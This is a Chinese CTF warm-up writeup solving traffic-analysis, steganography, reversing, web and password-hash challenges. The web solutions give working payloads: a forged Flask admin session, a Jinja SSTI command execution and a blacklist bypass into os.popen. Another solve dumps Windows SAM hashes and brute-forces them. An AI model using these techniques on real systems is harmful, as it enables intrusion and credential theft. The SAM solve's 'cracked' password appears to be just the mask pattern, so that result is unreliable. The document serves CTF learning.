# [个人团队] FurryCTF2025热身赛的Writeup

> # furryCTF 2025 赛前热身
>
> **110**支队伍已报名
>
> 开始时间
>
> 2025年12月27日凌晨12点00分
>
> 结束时间
>
> 2026年1月30日中午12点00分
>
> 
>
> 为了给新人师傅熟悉一下平台，顺带丢弃一些可能没那么好玩的题目，在这里开一个赛前热身owo
>
> **比赛的flag统一为furryCTF{Something_there}**
>
> 赛前热身并不会影响正赛结果，也不会有正赛的题目，只是熟悉平台用的哦owo
>
> **话说别忘了报名正赛喵~**



# Week1

## Misc

### IIS服务器(probie)

#### 解题过程

**查看提示**

```shell
猫猫前段时间闲着没事搭建了一个IIS服务器。

不过，最近猫猫发现，服务器上好像多了个文件……？
```

**流量分析**

用`wireshark`打开`IIS.pcapng`

`文件 -> 导出对象 -> HTTP -> f12g.txt -> 保存 `

```shell
ZnVycnlDVEZ7RGlkX1lvdV9Ob3RlX1RoZV9EaWZmX0luX0Vycm9yX1BhZ2U/fQ==
```

**Base64解码**

```shell
furryCTF{Did_You_Note_The_Diff_In_Error_Page?}
```

**得到：furryCTF{Did_You_Note_The_Diff_In_Error_Page?}**



### 新的一年，新的开始(probie)

#### 解题过程

**查看提示**

```shell
Catch The Future

Time to own 2025

Forever young in hacking

furryCTF{h4ppY_n3w_y34r_2o25_w1th_1Ov3}

祝各位师傅：

栈上生花，堆里藏月，逆向不秃，web不坐牢，pwn穿一切，ak全场！ 🚩🎉
```

**得到：furryCTF{h4ppY_n3w_y34r_2o25_w1th_1Ov3}**



### 盲盒(probie)

#### 解题过程

下载得到`盲盒.xlsx`

**修改后缀名**得到`盲盒.zip`

解压查看文件`盲盒\xl\sharedStrings.xml`

```shell
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="762826" uniqueCount="2"><si><t>来开盲盒吧~</t><phoneticPr fontId="1" type="noConversion"/></si><si><t>flag        不在这</t><phoneticPr fontId="1" type="noConversion"/></si></sst>
<!-- ‬‌‬﻿﻿﻿‍‬‍‍‍‬‌﻿﻿﻿﻿﻿﻿﻿‌‌﻿‌‍‌﻿﻿‍‬‌‌‬‌﻿﻿﻿‍‬‌‍‍‌‬‌‬‬﻿‬‌‬﻿﻿﻿‍‌‍‌﻿‬﻿‍‍‬‬‌﻿﻿﻿‍‬‌‍﻿‍﻿‌‍﻿﻿‍‍﻿‌‌﻿‌‍‍‍‍﻿‌‬‬‌‬‌﻿﻿﻿‍‬‍‬‍‌‍﻿‌﻿‌‌‌‌‌‍‬﻿‬‌‌‌‌‍﻿‍﻿‌‌‌‌‍‬﻿‬‌‌‌‌‍﻿﻿‬‌‌‌‌‌‌‬‬‌‌‌‌‍‬‍‬‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍﻿‌‌‌‌‍﻿‬﻿‌‌‌‌‍‍‬‬我也没说‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‬‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‍‍‌‌‌‌‌‍‬‬‌‌‌‌‌‍‬‍‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‍‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍﻿‌‬‌‌‌‌‌﻿‌‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‍﻿‌‌‌‌‍‍﻿﻿flag‌‌‌‌‍‌‬‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‍﻿﻿‌‌‌‌‍‌‍‍‌‌‌‌‍﻿‬‌在这呀‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‍nwn‌‌‌‌‍‬﻿‌‌‌‌‌‍﻿﻿‍，你不会想在这里找到flag叭~ -->
```

将内容复制粘贴到零宽隐写解码器进行解码

```shell
诶嘿，你还别说他还真就在这里nwn~
flag{Z19_The_Str1ng_In_Exc9l}
```

修改flag格式

**得到：furryCTF{Z19_The_Str1ng_In_Exc9l}**



### 签到题(probie)

#### 解题过程

**查看提示**

```shell
话说，你们有发现比赛平台上藏有一个flag吗？
```

**查看主页**

```shell
> furryCTF{Hack_for_fun_not_for_profit}_
```

**得到：furryCTF{Hack_for_fun_not_for_profit}**



## Reverse

### 猜数字(probie)

#### 解题过程

`Shift + F12`打开`Strings`找到`furryCTF{Rev_Is_1nterest1ng}`

**得到：furryCTF{Rev_Is_1nterest1ng}**



## Web

### 固若金汤(probie)

#### 解题过程

**查看提示**

```shell
或许dirsearch有惊喜？
```

**Dirsearch扫描**

```shell
python dirsearch.py -u http://ctf.furryctf.com:32791/ -e *
```

```shell
[20:43:47] 404 -  548B  - /.git-credentials
[20:43:47] 404 -  548B  - /.git.json
[20:43:47] 200 -   23B  - /.git/HEAD
[20:43:47] 200 -    1KB - /.git/
[20:43:47] 404 -  548B  - /.git-rewrite/
[20:43:47] 404 -  548B  - /.git/hooks/commit-msg
[20:43:47] 301 -  162B  - /.git  ->  http://ctf.furryctf.com/.git/
[20:43:47] 404 -  548B  - /.git/hooks/applypatch-msg
[20:43:47] 404 -  548B  - /.git/hooks/post-update
[20:43:47] 404 -  548B  - /.git/hooks/pre-applypatch
[20:43:47] 404 -  548B  - /.git/hooks/pre-push
[20:43:47] 404 -  548B  - /.git/hooks/pre-commit
[20:43:47] 404 -  548B  - /.git/hooks/pre-rebase
[20:43:47] 404 -  548B  - /.git/hooks/pre-receive
[20:43:47] 404 -  548B  - /.git/hooks/prepare-commit-msg
[20:43:47] 404 -  548B  - /.git/hooks/update
[20:43:47] 404 -  548B  - /.git/info/refs
[20:43:47] 404 -  548B  - /.git/info/attributes
[20:43:47] 200 -  240B  - /.git/info/exclude
[20:43:47] 404 -  548B  - /.git/logs/head
[20:43:47] 301 -  162B  - /.git/logs/refs  ->  http://ctf.furryctf.com/.git/logs/refs/
[20:43:47] 200 -  436B  - /.git/logs/HEAD
[20:43:47] 301 -  162B  - /.git/logs/refs/heads  ->  http://ctf.furryctf.com/.git/logs/refs/heads/
[20:43:47] 404 -  548B  - /.git/logs/refs/remotes/origin/master
[20:43:47] 404 -  548B  - /.git/logs/refs/remotes/origin/HEAD
[20:43:47] 301 -  162B  - /.git/refs/heads  ->  http://ctf.furryctf.com/.git/refs/heads/
[20:43:47] 404 -  548B  - /.git/refs/remotes
[20:43:47] 404 -  548B  - /.git/refs/remotes/origin/HEAD
[20:43:47] 301 -  162B  - /.git/refs/tags  ->  http://ctf.furryctf.com/.git/refs/tags/
[20:43:47] 404 -  548B  - /.git/refs/remotes/origin
[20:43:47] 404 -  548B  - /.git/refs/remotes/origin/master
[20:43:47] 404 -  548B  - /.git2/
[20:43:47] 404 -  548B  - /.gitchangelog.rc
[20:43:47] 404 -  548B  - /.git_release
[20:43:47] 404 -  548B  - /.github/PULL_REQUEST_TEMPLATE.md
[20:43:47] 404 -  548B  - /.gitattributes
[20:43:47] 404 -  548B  - /.git/logs/refs/remotes
[20:43:47] 404 -  548B  - /.gitconfig
[20:43:47] 404 -  548B  - /.github/workflows/ci.yml
[20:43:47] 404 -  548B  - /.github/ISSUE_TEMPLATE.md
[20:43:47] 200 -  436B  - /.git/logs/refs/heads/master
[20:43:47] 404 -  548B  - /.git/objects/info/packs
[20:43:47] 404 -  548B  - /.github/workflows/docker.yml
[20:43:47] 404 -  548B  - /.github/workflows/master.yml
[20:43:47] 404 -  548B  - /.github/workflows/publish.yml
[20:43:47] 404 -  548B  - /.git/logs/refs/remotes/origin
[20:43:47] 404 -  548B  - /.gitignore.orig
[20:43:47] 404 -  548B  - /.github/workflows/nodejs.yml
[20:43:47] 404 -  548B  - /.gitignore
[20:43:47] 404 -  548B  - /.github/workflows/blank.yml
[20:43:47] 200 -   41B  - /.git/refs/heads/master
[20:43:47] 404 -  548B  - /.gitignore/
[20:43:47] 404 -  548B  - /.gitignore~
[20:43:47] 404 -  548B  - /.gitignore_global
[20:43:47] 404 -  548B  - /.github/
[20:43:47] 404 -  548B  - /.gitlab-ci.yml
[20:43:47] 404 -  548B  - /.gitlab-ci/.env
[20:43:47] 404 -  548B  - /.gitlab
[20:43:47] 404 -  548B  - /.gitkeep
[20:43:47] 404 -  548B  - /.gitlab-ci.off.yml
[20:43:47] 404 -  548B  - /.gitk
[20:43:47] 404 -  548B  - /.gitlab/merge_request_templates
[20:43:47] 404 -  548B  - /.github/workflows/dependabot.yml
[20:43:47] 404 -  548B  - /.gitlab/route-map.yml
[20:43:47] 404 -  548B  - /.gitmodules
[20:43:47] 404 -  548B  - /.gitreview
[20:43:47] 404 -  548B  - /.github/workflows/maven.yml
[20:43:47] 404 -  548B  - /.gitlab/issue_templates
[20:44:04] 302 -  199B  - /dashboard  ->  /login
[20:44:12] 200 -  162KB - /login
[20:44:23] 404 -  548B  - /static.jsp
[20:44:23] 404 -  548B  - /static.asp
[20:44:23] 404 -  548B  - /static..
[20:44:23] 404 -  548B  - /static.js
[20:44:23] 404 -  548B  - /static.htm
[20:44:23] 404 -  548B  - /static.do
[20:44:23] 404 -  548B  - /static/api/swagger.json
[20:44:23] 404 -  548B  - /static/api/swagger.yaml
[20:44:23] 404 -  548B  - /static.action
[20:44:23] 404 -  548B  - /static.aspx
[20:44:23] 301 -  162B  - /static  ->  http://ctf.furryctf.com/static/
[20:44:23] 404 -  548B  - /static.tar.gz
[20:44:23] 404 -  548B  - /static.html
[20:44:23] 404 -  548B  - /static/dump.sql
[20:44:23] 404 -  548B  - /static.cgi
[20:44:23] 404 -  548B  - /static.php
```

**分析**

- 发现存在`http://ctf.furryctf.com/.git/`

**GitHack下载源码**

```shell
python GitHack.py http://ctf.furryctf.com:32791/.git/
```

```shell
[+] Download and parse index file ...
[+] app.py
[+] config.py
[+] requirements.txt
[+] static/css/main.css
[+] templates/base.html
[+] templates/bootstrap.min.css
[+] templates/home.html
[+] templates/login.html
[OK] requirements.txt
[OK] config.py
[OK] templates/home.html
[OK] templates/login.html
[OK] app.py
[OK] static/css/main.css
[OK] templates/base.html
[OK] templates/bootstrap.min.css
```

**查看源码**

`app.py`

```python
from flask import Flask, session, request, render_template, render_template_string, redirect, url_for
import os
import sys
import random

# ... 省略部分代码 ...

@app.route('/dashboard')
def dashboard():
    if session.get('role') == 'admin':
        username = request.args.get('u', 'Administrator')
        template = f"""
        {% extends "base.html" %}
        {% block content %}
        <div class="alert alert-success">
            <h2>欢迎回到管理控制台, {username}!</h2>
            <p>系统完整性检查：通过</p>
            <p>Flag 服务状态：待机</p>
        </div>
        {% endblock %}
        """
        return render_template_string(template)
    else:
        return redirect(url_for('login'))
```

`config.py`

```python
import os
# Auto-generated by KMS rotation service
SECRET_KEY = os.urandom(32)
SECRET_KEY_FALLBACKS = ["This_key_has_been_deprecated_v2023"]
```

**分析**

- `dashboard`路由中存在明显`ssti`漏洞
- `SECRET_KEY_FALLBACKS`密钥数组采用硬编码`This_key_has_been_deprecated_v2023`

**还原session**

```python
import flask
from flask.sessions import SecureCookieSessionInterface

app = flask.Flask(__name__)
app.secret_key = "This_key_has_been_deprecated_v2023"

interface = SecureCookieSessionInterface()
signer = interface.get_signing_serializer(app)

session_data = {'role': 'admin'}
session_cookie = signer.dumps(session_data)

print(session_cookie)
```

```shell
eyJyb2xlIjoiYWRtaW4ifQ.aVuo6g.XnEUebNmcePxujxe9cgviPQnXFk
```

**获取flag**

进入到仪表盘后执行payload

```shell
http://ctf.furryctf.com:32787/dashboard?u={{request.application.__globals__.__builtins__.__import__("os").popen("cat /flag").read()}}
```

```shell
欢迎回到管理控制台, furryCTF{244005e08aa0_KEY_Clrc13_mlgHt_b3_FI4W5_aS_weIL}}!
```

**得到：furryCTF{244005e08aa0_KEY_Clrc13_mlgHt_b3_FI4W5_aS_weIL}**



### DeepSleep(probie)

#### 解题过程

**查看提示**

```shell
猫猫最近开发出一款新的AI语言模型DeepSleep：

try:
   question = input("").decode('utf-8')
except:
    question = u"服务器繁忙，请稍后再试。"
try:
   response = (question
                .replace(u"请问", u"")
                .replace(u"问", u"")
                .replace(u"吗", u"呀")
                .replace(u"你", u"我")
                .replace(u"？", u"！"))

print response.encode("utf-8")
为了猫猫的系统安全，猫猫设置了非常严格的BLACKLIST哦，会像上面的程序一样给你replace掉~（前后端都有的那种nwn）

还有就是，这里没有flag，所以不要试图问AI从哪里获得flag哦~

他会生气不理你的uwu~

好啦，猫猫知道你不会自觉的nwn，所以猫猫已经在后端帮你把所有flag都替换掉了哦~

快说：谢谢猫猫~
```

**渗透测试**

```shell
{"input":"你好"}
```

```shell
{status: "success", processed_result: "服务器繁忙，请稍后再试。", message: "来自 DeepSleep 的回复",…}
input_received
: 
"你好"
message
: 
"来自 DeepSleep 的回复"
processed_result
: 
"服务器繁忙，请稍后再试。"
status
: 
"success"
```

```shell
{"input":"'你好'"}
```

```shell
{status: "success", processed_result: "我好", message: "来自 DeepSleep 的回复", input_received: "'你好'"}
input_received
: 
"'你好'"
message
: 
"来自 DeepSleep 的回复"
processed_result
: 
"我好"
status
: 
"success"
```

**分析**

- 它应该是这么个结构`print(input)`，其中`input`只能为`str`，所以我们的`input`才要带双引号才能不报错
- 我们可以构造`__import__('os').popen('cat flag').read()`来获取`flag`

**继续测试**

```shell
{"input": "\"__import__('os').popen('cat flag').read()\""}
```

```shell
{"status": "success", "processed_result": "____('').p(' ').()", "message": "\u6765\u81ea DeepSleep \u7684\u56de\u590d", "input_received": "\"__import__('os').popen('cat flag').read()\""}
```

**分析**

- 它过滤了一些字符，但不会循环过滤，我们可以构造形如`ooss`来代表`os`

**发起渗透**

```shell
{"input": "'f '+__imporimportt__('ooss').popeopenn('cacatt fla'+'g').reareadd()[1:50]"}
```

```shell
{"status": "success", "processed_result": "f urryCTF{cd03bab181a8_D0_Not_U5e_Inpu7_In_Pyth0n2}", "message": "\u6765\u81ea DeepSleep \u7684\u56de\u590d", "input_received": "'f '+__imporimportt__('ooss').popeopenn('cacatt fla'+'g').reareadd()[1:50]"}
```

**得到：furryCTF{cd03bab181a8_D0_Not_U5e_Inpu7_In_Pyth0n2}**



## Crypto

### SAM(probie)(尝试)

### 解题过程

**查看提示**

```shell
猫猫不小心把自己设的密码给忘了，你能帮猫猫恢复一下嘛？

注：flag格式为furryCTF{furryCTF账户的密码}

Hint：猫猫给你准备了一份工具：（这也是猫猫唯一记得的东西了）

?l?l?l?l?l?s......（最后三位忘了.jpg）
```

**信息搜集**

```shell
file SAM
```

```shell
SAM: MS Windows registry file, NT/2000 or above
```

```shell
file SYSTEM
```

```shell
SYSTEM: MS Windows registry file, NT/2000 or above
```

**分析**

- `SAM`文件是 Windows 操作系统的安全账户管理器注册表文件，用于存储本地用户账户的密码哈希（不是明文密码）
- SYSTEM 文件则存储了破解 SAM 哈希所需的系统密钥（Bootkey）

**获取密文**

```shell
sudo apt install python3-impacket -y
```

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM local
```

```shell
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa2ed516b7432a048a25ac616229b8d8e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
furryCTF:1000:aad3b435b51404eeaad3b435b51404ee:861bd8bac91cac40013172f47ab784a4:::
[*] Cleaning up...
```

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -bootkey a2ed516b7432a048a25ac616229b8d8e -sam SAM local
```

```shell
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
furryCTF:1000:aad3b435b51404eeaad3b435b51404ee:861bd8bac91cac40013172f47ab784a4:::
[*] Cleaning up...
```

**得到密文：861bd8bac91cac40013172f47ab784a4**

**破解密文**

```shell
hashcat -m 1000 -a 3 -O -w 3 861bd8bac91cac40013172f47ab784a4 ?l?l?l?l?l?s?a?a?a
```

```shell
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 9 7945HX with Radeon Graphics, 1470/2940 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (2164 MB free)

Cracking performance lower than expected?                 

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 
```

**分析**

- `?l`代表纯小写
- `?s`代表特殊字符
- `?d`代表数字
- `?a`代表任意

```shell
hashcat -m 1000 --show <<< "861bd8bac91cac40013172f47ab784a4"
```

```shell
lllllsaaa
```

**得到密码：lllllsaaa**

补全flag格式

**得到：furryCTF{lllllsaaa}**



# 团队

## 团队名称

**菜鸟对对队**



## 团队口号

**对对对对对**



## 团队人员

### 队长

- **probie**

### 队员

- **fliaz**
- **kine**



# 赠言

## probie

- **暂无**

## fliaz

- **暂无**

## kine

- **暂无**
